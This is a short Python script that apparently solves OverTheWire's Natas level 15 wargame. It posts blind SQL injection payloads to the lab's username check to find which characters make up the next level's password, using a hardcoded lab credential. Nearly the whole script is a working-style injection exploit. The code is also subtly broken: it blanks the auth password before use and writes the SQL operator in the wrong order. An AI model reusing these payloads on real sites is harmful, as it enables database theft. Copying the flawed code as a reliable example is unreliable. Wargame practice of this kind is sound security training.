#!/usr/bin/env python

import requests
import re
import string

username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

url = 'http://%s.natas.labs.overthewire.org/index.php' % username

#SELECT * from users where username=\"".$_REQUEST["username"]."\"

a = string.ascii_lowercase + string.ascii_uppercase + string.digits
dictionary = '' #abcehijmnopqrtwABCEHIJMNOPQRTW03569
password = ''

# for i in range(len(dictionary)):
# 	exploit = 'natas16\" and password like \"' + password + dictionary[i] + '%\" #'

# 	payload = {'username': exploit, 'submit': 'Check existence'}

# 	r = requests.post(url, auth=(username, password), params='debug', data=payload)

# 	if re.findall('This user exist.', r.text):
# 		password += dictionary[i]
# 		print("password is : "+password)

for i in range(len(a)):
	exploit = 'natas16\" AND password BINARY LIKE \"%' + a[i] + '%\" #'

	payload = {'username': exploit, 'submit': 'Check existence'}

	r = requests.post(url, auth=(username, password), params='debug', data=payload)

	if re.findall('This user exist.', r.text):
		dictionary += a[i]
	else:
		print(exploit + "=> gagal")

print(dictionary)